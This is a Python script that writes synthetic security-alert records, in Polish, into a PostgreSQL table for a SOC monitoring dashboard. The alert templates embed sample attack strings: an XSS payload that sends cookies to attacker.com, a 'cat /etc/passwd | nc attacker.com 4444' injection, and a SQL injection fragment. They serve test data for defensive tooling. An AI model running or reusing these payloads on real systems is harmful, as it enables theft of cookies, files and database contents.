"""
generate_test_logs.py
─────────────────────
Skrypt do generowania realistycznych, podejrzanych logów testowych
bezpośrednio do bazy danych PostgreSQL projektu SOC AI Agent.

Wstrzykuje różnorodne zdarzenia pokrywające wszystkie typy zagrożeń
obsługiwane przez dashboard (MITRE, SOAR, Discord, PDF).

Użycie:
    python generate_test_logs.py              # wstrzykuje 40 losowych logów
    python generate_test_logs.py --count 100  # wstrzykuje 100 logów
    python generate_test_logs.py --clear      # czyści tabelę przed wstrzyknięciem
    python generate_test_logs.py --clear --count 50

Wymagania:
    pip install sqlalchemy psycopg2-binary faker
"""

import argparse
import os
import random
from datetime import datetime, timedelta
from dotenv import load_dotenv
from sqlalchemy import create_engine, text

load_dotenv()

def fix_postgres_url(url: str) -> str:
    """Zapewnia kompatybilność ze sterownikiem psycopg2 gdy brak psycopg 3."""
    if url.startswith("postgresql://"):
        try:
            import psycopg  # noqa: F401
        except ImportError:
            url = url.replace("postgresql://", "postgresql+psycopg2://", 1)
    return url

# ─── Konfiguracja połączenia ──────────────────────────────────────────────────
# Port 5433 = zmapowany port Dockera (docker-compose.yml: "5433:5432")
# Zmień na 5432 jeśli łączysz się bezpośrednio wewnątrz kontenera
DB_URL = fix_postgres_url(os.getenv("DATABASE_URL", "postgresql://postgres:admin_password@localhost:5433/soc_db"))



# ─── Dane testowe ─────────────────────────────────────────────────────────────

# Złośliwe adresy IP (publicznie znane skanery, botnety, Tor exit nodes)
MALICIOUS_IPS = [
    "185.220.101.45",   # Tor exit node
    "45.155.205.233",   # Znany skaner
    "194.165.16.11",    # Botnet C2
    "91.191.209.42",    # Ransomware dropper
    "198.199.122.220",  # Brute-force SSH
    "62.102.148.68",    # Port scanner (Shodan)
    "185.220.100.253",  # Tor relay
    "5.188.206.26",     # Malware distribution
    "103.41.166.118",   # DDoS source
    "31.184.198.23",    # RDP brute-force
]

# Legalne adresy IP (wewnętrzne lub zaufane)
CLEAN_IPS = [
    "192.168.1.10",
    "192.168.1.15",
    "10.0.0.5",
    "10.0.0.20",
    "172.16.0.3",
]

# Scenariusze zagrożeń: (event_type, threat_type, severity, is_malicious, reasoning_template)
THREAT_SCENARIOS = [
    # ── KRYTYCZNE ─────────────────────────────────────────────────────
    (
        "PROC_INJECTION",
        "Lateral Movement",
        "critical",
        True,
        "Wykryto wstrzyknięcie kodu do procesu lsass.exe z {ip}. "
        "Wskazuje na próbę kradzieży danych uwierzytelniających (Mimikatz / credential dump).",
    ),
    (
        "RANSOMWARE_ACTIVITY",
        "Ransomware",
        "critical",
        True,
        "Masowe operacje szyfrowania plików wykryte z hosta {ip}. "
        "Rozszerzenia .locked/.enc pojawiają się w udziałach sieciowych. "
        "Możliwa infekcja ransomware — natychmiastowa izolacja wymagana.",
    ),
    (
        "C2_BEACON",
        "C2 Beacon",
        "critical",
        True,
        "Regularne połączenia wychodzące do {ip} co 30 sekund. "
        "Wzorzec beaconingu sugeruje aktywną komunikację z infrastrukturą C2 (Command & Control).",
    ),
    (
        "PRIV_ESCALATION",
        "Privilege Escalation",
        "critical",
        True,
        "Próba eskalacji uprawnień przez exploit CVE-2023-21768 (Windows ALPC). "
        "Źródło: {ip}. Konto użytkownika uzyskało uprawnienia SYSTEM.",
    ),
    (
        "DATA_EXFILTRATION",
        "Exfiltration",
        "critical",
        True,
        "Transfer danych >500MB do zewnętrznego IP {ip} przez port 443. "
        "Możliwa eksfiltracja danych przez zaszyfrowany tunel HTTPS.",
    ),

    # ── WYSOKIE ───────────────────────────────────────────────────────
    (
        "BRUTE_FORCE_SSH",
        "Brute Force",
        "high",
        True,
        "Wykryto 847 nieudanych prób logowania SSH z {ip} w ciągu 2 minut. "
        "Typowy wzorzec ataku credential stuffing na konta administracyjne.",
    ),
    (
        "BRUTE_FORCE_RDP",
        "Brute Force",
        "high",
        True,
        "Atak brute-force na protokół RDP (port 3389) z {ip}. "
        "Zarejestrowano 312 prób logowania. Konto Administrator tymczasowo zablokowane.",
    ),
    (
        "SQL_INJECTION",
        "SQL Injection",
        "high",
        True,
        "Wykryto payload SQL Injection w żądaniu HTTP z {ip}: "
        "' OR 1=1 -- / UNION SELECT * FROM users. "
        "Możliwa próba wycieku danych z bazy aplikacji webowej.",
    ),
    (
        "MALWARE_DOWNLOAD",
        "Malware",
        "high",
        True,
        "Pobranie pliku wykonywalnego z podejrzanego hosta {ip}. "
        "Hash SHA256 dopasowany do sygnatury trojana Emotet w bazie VirusTotal (47/72 AV).",
    ),
    (
        "PORT_SCAN_FULL",
        "Port Scan",
        "high",
        True,
        "Pełne skanowanie portów TCP (SYN scan) z {ip}. "
        "Przeskanowano 65535 portów w 4 sekundy. "
        "Narzędzie: prawdopodobnie nmap z flagą -sS.",
    ),

    # ── ŚREDNIE ───────────────────────────────────────────────────────
    (
        "PORT_SCAN_PARTIAL",
        "Port Scan",
        "medium",
        True,
        "Skanowanie popularnych portów usługowych z {ip}: "
        "22, 80, 443, 3389, 8080, 5432. Faza rozpoznawania infrastruktury.",
    ),
    (
        "XSS_ATTEMPT",
        "XSS",
        "medium",
        True,
        "Wykryto próbę Cross-Site Scripting (XSS) z {ip}. "
        "Payload: <script>document.location='http://attacker.com/steal?c='+document.cookie</script>",
    ),
    (
        "CMD_INJECTION",
        "Command Injection",
        "medium",
        True,
        "Wykryto próbę wstrzyknięcia polecenia systemowego w parametrze URL z {ip}: "
        "; cat /etc/passwd | nc attacker.com 4444. Możliwa podatność RCE.",
    ),
    (
        "ANOMALY_TRAFFIC",
        "Anomaly",
        "medium",
        True,
        "Niezwykły wzorzec ruchu sieciowego z {ip}: "
        "17GB danych wychodzących do zewnętrznego IP poza godzinami pracy (02:00-04:00). "
        "Możliwa nieautoryzowana aktywność lub insider threat.",
    ),
    (
        "PHISHING_EMAIL",
        "Phishing",
        "medium",
        True,
        "Email phishingowy z fałszywą domeną microsoft-security-alert.ru ({ip}) "
        "dostarczony do 23 skrzynek firmowych. Zawiera złośliwy attachment .docm z makrami.",
    ),

    # ── NISKIE (suspicious ale nie krytyczne) ─────────────────────────
    (
        "FAILED_LOGIN",
        "Brute Force",
        "low",
        True,
        "5 nieudanych prób logowania z {ip} na konto admin@internal. "
        "Poniżej progu blokady, ale warto monitorować.",
    ),
    (
        "DDOS_ATTEMPT",
        "DDoS",
        "high",
        True,
        "Wykryto atak DDoS (UDP Flood) z {ip}. "
        "Ruch: 12Gbps, 8 milionów pakietów/s. Możliwa próba przeciążenia infrastruktury.",
    ),

    # ── CZYSTE ZDARZENIA (is_malicious=False) ─────────────────────────
    (
        "NORMAL_HTTP",
        "Brak",
        "low",
        False,
        "Standardowe żądanie HTTP GET z {ip}. Ruch normalny, brak anomalii.",
    ),
    (
        "NORMAL_DNS",
        "Brak",
        "low",
        False,
        "Standardowe zapytanie DNS z {ip}. Domena whitelist. Brak zagrożeń.",
    ),
    (
        "SYSTEM_UPDATE",
        "Brak",
        "low",
        False,
        "Aktualizacja systemu operacyjnego z {ip}. "
        "Połączenie do windowsupdate.microsoft.com — działanie autoryzowane.",
    ),
]

# ─── SQL tworzący tabelę (jeśli nie istnieje) ────────────────────────────────
CREATE_TABLE_SQL = """
CREATE TABLE IF NOT EXISTS analyzed_logs (
    id            SERIAL PRIMARY KEY,
    timestamp     TIMESTAMPTZ DEFAULT NOW(),
    source_ip     VARCHAR(45)  NOT NULL,
    event_type    VARCHAR(100) NOT NULL,
    is_malicious  BOOLEAN      NOT NULL DEFAULT FALSE,
    threat_type   VARCHAR(100) NOT NULL DEFAULT 'Brak',
    severity      VARCHAR(20)  NOT NULL DEFAULT 'low',
    reasoning     TEXT
);
"""

INSERT_SQL = """
INSERT INTO analyzed_logs
    (timestamp, source_ip, event_type, is_malicious, threat_type, severity, reasoning)
VALUES
    (:timestamp, :source_ip, :event_type, :is_malicious, :threat_type, :severity, :reasoning);
"""


def generate_log_entry(scenario: tuple, offset_minutes: int) -> dict:
    """Generuje jeden rekord logu na podstawie scenariusza."""
    event_type, threat_type, severity, is_malicious, reasoning_tmpl = scenario

    # Wybierz IP pasujące do scenariusza
    ip = random.choice(MALICIOUS_IPS) if is_malicious else random.choice(CLEAN_IPS)
    reasoning = reasoning_tmpl.format(ip=ip)

    # Losowy timestamp z ostatnich 48h (rozkład: więcej zdarzeń w "godzinach pracy")
    base_time = datetime.now() - timedelta(minutes=offset_minutes)

    return {
        "timestamp":    base_time,
        "source_ip":    ip,
        "event_type":   event_type,
        "is_malicious": is_malicious,
        "threat_type":  threat_type,
        "severity":     severity,
        "reasoning":    reasoning,
    }


def run(count: int = 40, clear: bool = False):
    print(f"\n🔧 SOC AI — Generator Testowych Logów")
    print(f"   Cel: postgresql://localhost:5433/soc_db")
    print(f"   Liczba rekordów: {count}")
    print(f"   Czyszczenie tabeli: {'TAK' if clear else 'NIE'}")
    print("─" * 50)

    try:
        engine = create_engine(DB_URL, connect_args={"connect_timeout": 5})
        with engine.connect() as conn:

            # Utwórz tabelę jeśli nie istnieje
            conn.execute(text(CREATE_TABLE_SQL))
            conn.commit()
            print("  ✅ Tabela analyzed_logs — gotowa")

            # Opcjonalne czyszczenie
            if clear:
                result = conn.execute(text("DELETE FROM analyzed_logs"))
                conn.commit()
                print(f"  🗑️  Usunięto {result.rowcount} starych rekordów")

            # Generowanie i wstawianie logów
            inserted = 0
            errors   = 0

            # Mieszamy scenariusze żeby pokryć wszystkie typy
            scenarios_pool = []
            while len(scenarios_pool) < count:
                scenarios_pool.extend(random.sample(THREAT_SCENARIOS, min(len(THREAT_SCENARIOS), count)))
            scenarios_pool = scenarios_pool[:count]
            random.shuffle(scenarios_pool)

            print(f"\n  Wstrzykiwanie {count} rekordów...\n")

            for i, scenario in enumerate(scenarios_pool):
                # Rozkład czasowy: ostatnie 48h, koncentracja na ostatnich 4h
                if i < count * 0.4:
                    offset = random.randint(0, 240)        # ostatnie 4h (najnowsze)
                elif i < count * 0.7:
                    offset = random.randint(240, 1440)     # 4-24h
                else:
                    offset = random.randint(1440, 2880)    # 24-48h

                entry = generate_log_entry(scenario, offset)

                try:
                    conn.execute(text(INSERT_SQL), entry)
                    status = "🔴 KRYTYCZNY" if entry["severity"] == "critical" else \
                             "🟠 WYSOKI"   if entry["severity"] == "high"     else \
                             "🟡 ŚREDNI"   if entry["severity"] == "medium"   else \
                             "🟢 NISKI"
                    malicious_tag = "⚠️  ZŁOŚLIWY" if entry["is_malicious"] else "✅ CZYSTY  "
                    print(f"  [{i+1:3d}/{count}] {malicious_tag} | {status:12s} | "
                          f"{entry['threat_type']:25s} | {entry['source_ip']}")
                    inserted += 1
                except Exception as e:
                    print(f"  [{i+1:3d}/{count}] ❌ Błąd wstawiania: {e}")
                    errors += 1

            conn.commit()

            # Statystyki końcowe
            row = conn.execute(text("SELECT COUNT(*) FROM analyzed_logs")).fetchone()
            total_in_db = row[0]

        print("\n" + "─" * 50)
        print(f"  ✅ Wstawiono:        {inserted} rekordów")
        if errors:
            print(f"  ❌ Błędy:           {errors} rekordów")
        print(f"  📊 Łącznie w bazie: {total_in_db} rekordów")

        malicious_count = sum(1 for s in scenarios_pool if s[3])
        print(f"  🔴 Złośliwych:      {malicious_count}")
        print(f"  🟢 Czystych:        {count - malicious_count}")
        print("\n  💡 Odśwież dashboard Streamlit żeby zobaczyć nowe logi!")

    except Exception as e:
        print(f"\n  ❌ BŁĄD POŁĄCZENIA Z BAZĄ: {e}")
        print("\n  Sprawdź czy Docker działa:")
        print("    docker-compose up -d db")
        print("  Sprawdź port (docker-compose.yml mapuje 5433:5432)")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Generator testowych logów SOC dla bazy PostgreSQL"
    )
    parser.add_argument(
        "--count", type=int, default=40,
        help="Liczba rekordów do wygenerowania (domyślnie: 40)"
    )
    parser.add_argument(
        "--clear", action="store_true",
        help="Wyczyść tabelę przed wstrzyknięciem nowych danych"
    )
    args = parser.parse_args()
    run(count=args.count, clear=args.clear)

